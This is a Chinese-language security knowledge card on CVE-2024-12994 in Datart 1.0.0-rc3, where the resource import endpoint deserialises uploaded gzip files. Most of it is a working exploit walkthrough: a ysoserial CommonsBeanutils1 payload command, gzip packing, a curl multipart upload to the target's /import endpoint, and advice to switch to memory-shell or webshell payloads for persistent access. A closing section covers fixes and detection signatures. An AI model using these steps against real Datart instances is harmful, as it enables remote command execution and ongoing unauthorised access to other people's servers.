---
id: web-java-deserialization-datart-import-resource-gzip-readobject
title: Datart 资源导入 GZIP 包裹原生反序列化：multipart 上传 .ser.gz 触发 CommonsBeanutils1 命令执行（CVE-2024-12994）
type: scenario
domain: web
path: web/java/deserialization
technique: datart-import-gzip-objectinputstream-rce
aliases:
- Datart import 反序列化
- CVE-2024-12994
- extractModel 反序列化
- GZIPInputStream ObjectInputStream 上传
- 资源迁移管理 导入 GetShell
tags:
- java
- deserialization
- gzip
- multipart
- spring
- commons-beanutils
- ysoserial
- rce
cve:
- CVE-2024-12994
affected_versions: 1.0.0-rc3
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W1
  verified_at: '2026-11-08T11:33:32+08:00'
  notes: 已对照原文核对；原文 extractModel 两行 new ObjectInputStream(new GZIPInputStream(file.getInputStream())).readObject() 并强转 TransferModel、入口 VizController.importViz→VizServiceImpl.importResource→extractModel 无过滤，payload 为 ysoserial CommonsBeanutils1 经 gzip 后上传并 /test/1.txt 落地成功，与卡片一致；CVE-2024-12994 与受影响版本 1.0.0-rc3 经原文 CVE 通告页核对无误，affected_versions 已归一为 1.0.0-rc3。未验证点：原文未展示 curl 完整 multipart 字段名与 importStrategy/orgId 取值，卡片该段属按接口惯例补全
---

## 一句话结论

Datart 的「资源迁移管理 → 数据导入」接口把一个用户上传的 multipart 文件直接交给 `new ObjectInputStream(new GZIPInputStream(file.getInputStream()))` 并 `readObject()`，没有任何类型白名单、也没有先校验内容格式；攻击者只要把 ysoserial 生成的 gadget 序列化流用 gzip 重新打包成 `.ser.gz` 上传，即可在目标 JVM 内触发 `CommonsBeanutils1` 链执行任意命令（CVE-2024-12994）。

## 原理

- **危险组合就在两行**：`extractModel(MultipartFile file)` 的实现是 `new ObjectInputStream(new GZIPInputStream(file.getInputStream()))` 后直接 `readObject()` 并强转为 `TransferModel`。`ObjectInputStream.readObject()` 是 Java 原生反序列化，读取流时会按类描述符实例化对象并调用 `readObject`/`readResolve` 等钩子；强转只发生在读完之后，**执行早已完成**，所以「期望类型是 TransferModel」完全不能起到限制作用。
- **GZIP 只是外层包装**：`GZIPInputStream` 只负责解压，不改变「里面是 Java 序列化流」这一事实。它反而是一个便利点——攻击者不需要改 gadget，只要对现有 `payload.ser` 做一次 gzip 压缩即可投递；同时也意味着目标端**必须先解压再反序列化**，压缩层不能提供任何安全收益（既不加密也不校验）。
- **入口链路清晰、无过滤**：`VizController.importViz` → `VizServiceImpl.importResource(file, importStrategy, orgId)` → `extractModel(file)`。`importResource` 只是在 `extractModel` 外包了 `try/catch` 与日志，异常被吞掉并转成业务错误提示，**不做类型校验、大小校验或格式校验**；因此唯一的安全边界就是反序列化本身。
- **gadget 来源是 classpath**：Datart 依赖 Spring 体系与 Apache Commons 组件，`CommonsBeanutils1`（`TemplatesImpl` + `BeanComparator`）在默认依赖下可用；ysoserial 生成该链即得到「构造期无副作用、反序列化时执行」的 payload，适配 `touch`/命令执行。
- **为什么能命令执行**：链尾用 `TemplatesImpl` 的 `_bytecodes` 定义一个 `AbstractTranslet` 子类，其静态块或 `transform` 里执行 `Runtime.exec`；`TemplatesImpl.newTransformer` 由 `BeanComparator.compare` 经 `PriorityQueue` 触发。整个执行发生在 `readObject` 期间，请求线程仍是 Web 线程，权限即应用进程权限。

## 触发条件

- 目标为受影响的 Datart 版本（原文分析 1.0.0-rc3），`/import`（`VizController.importViz`）接口可达。
- 攻击者能进入「资源迁移管理」页面或直接构造该接口请求（需有效会话/组织 ID，取决于部署时该功能是否已收敛权限）。
- 目标 classpath 中存在可用 gadget（CommonsBeanutils + CommonsCollections 相关依赖，默认发行版具备）。
- 未部署 JEP 290 `ObjectInputFilter`/`jdk.serialFilter`，也未在 `extractModel` 前置校验文件类型。
- 上传文件不被 WAF 按 `Content-Type`/扩展名拦截（`.ser.gz` 属非常规业务类型，通常需人工规则）。

## 利用步骤

1. 确认入口：访问资源迁移管理的「数据导入」，抓包记录 multipart 请求（字段名 `file`、策略参数 `importStrategy`、`orgId`）。
2. 用 ysoserial 生成原生序列化 payload：`java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/pwn.txt" > payload.ser`；先落地无副作用命令验证链路。
3. 对 payload 做 gzip 压缩得到 `payload.ser.gz`（`GZIPOutputStream` 逐块写入即可，注意关闭流以写完 trailer）。
4. 以原始 multipart 请求上传 `payload.ser.gz`（`filename` 保持 `.gz`，`Content-Type` 用 `application/gzip` 或业务默认值）。
5. 观察响应：即使返回「viz model extract error」或「import invalid」也属正常——异常发生在强转/后续业务阶段，**命令已在 `readObject` 时执行完毕**；到目标主机确认 `/tmp/pwn.txt` 存在。
6. 换成回显/内存马载荷（如 `TemplatesImpl` 定义 Filter 型内存马或写文件落地 webshell）以维持访问，避免只做一次性命令。

## PoC

```java
// 目标端的两行危险代码（原文核心）
public TransferModel extractModel(MultipartFile file) throws IOException, ClassNotFoundException {
    try (ObjectInputStream inputStream =
             new ObjectInputStream(new GZIPInputStream(file.getInputStream()))) {
        return (TransferModel) inputStream.readObject();
    }
}
```

```bash
# 1) 生成原生序列化 payload
java -jar ysoserial.jar CommonsBeanutils1 "touch /test/1.txt" > payload.ser

# 2) gzip 打包
gzip -c payload.ser > payload.ser.gz

# 3) multipart 上传（字段名与参数按抓包结果调整）
curl -sk -X POST "https://target/import" \
  -H "Cookie: <session>" \
  -F "file=@payload.ser.gz;type=application/gzip;filename=payload.ser.gz" \
  -F "importStrategy=NEW" -F "orgId=<orgId>"
```

```text
# 目标主机验证（原文截图）
root@a863c6d53461:/datart# cd /test/ && ls
1.txt
```

调用链（原文）：

```text
extractModel:596, VizServiceImpl
importResource:344, VizServiceImpl
VizServiceImpl$$FastClassBySpringCGLIB$$a2ea9a5a.invoke
VizServiceImpl$$EnhancerBySpringCGLIB$$a372364c.importResource
importViz:281, VizController
```

## 变体与关联

- **压缩层变体**：入口改用 `InflaterInputStream`/`ZipInputStream` 时，payload 需换成对应 Deflate/zip 封装；这类入口通常还伴随长度限制，需要压缩+短链技巧，见 [[web-java-deserialization-payload-length-compression]]。
- **gadget 变体**：`CommonsBeanutils1` 之外，`CommonsCollections` 各版本、`Spring AOP` 系列、`C3P0`、`H2 JDBC` 等在 classpath 有依赖时均可用；按实际依赖树选择。
- **投递面变体**：同类「导入/备份恢复/迁移」功能都是高价值反序列化入口（导出文件天然是二进制、运营人员习惯直接上传），排查思路一致：搜索 `ObjectInputStream`、`readObject`、`XStream.fromXML`、`SnakeYAML.load` 等调用点。
- **关联**：[[web-java-deser-commonscollections-cc6-hashmap-hashset-invokertransformer]]（同类原生反序列化 gadget 链）、[[web-java-deserialization-filter-rootchecked-first-class-bypass]]（目标已启用 JEP 290 过滤器时的绕过思路）、[[web-generic-file-upload-encrypted-webshell-av-bypass]]（命令执行后落地加密 webshell 的后续步骤）。
- **边界**：若目标启用 `ObjectInputFilter` 白名单只允许 `TransferModel` 等业务类，`BeanComparator` 会在类解析阶段被拒；若功能被收敛为仅管理员且需要二次授权，投递面缩小但链本身不变。

## 检测与防御

- **代码侧修复**：不要对不可信输入使用原生反序列化。改为 JSON/Protobuf 等数据格式；若必须兼容旧格式，在 `ObjectInputStream` 上调用 `setObjectInputFilter` 设置**允许类白名单**（仅业务模型及其基本字段类型），并在解压前限制解压后大小（防 gzip bomb）。
- **入口侧**：`extractModel` 前校验文件魔数（gzip 头 `1f 8b`）与内容结构，拒绝非预期扩展名；导入/恢复类功能加二次确认与权限收敛。
- **检测（流量）**：multipart 上传中 `filename` 以 `.ser.gz`/`.gz`/`.ser` 结尾；解压后内容以 `AC ED 00 05` 开头（Java 序列化魔数）；payload 中出现 `PriorityQueue`、`BeanComparator`、`TemplatesImpl`、`_bytecodes` 等特征字符串。
- **检测（主机）**：应用日志出现 `viz model extract error` 且伴随 `ClassNotFoundException`/`InvalidClassException`；进程在请求处理期间创建子进程或写出非业务文件；JVM 侧告警 `ObjectInputStream.readObject` 来自上传处理线程。
- **加固**：应用以最小权限运行，容器内禁用不必要的 shell 工具；限制出站连接；对关键功能做操作审计（谁在什么时间导入过什么文件）。
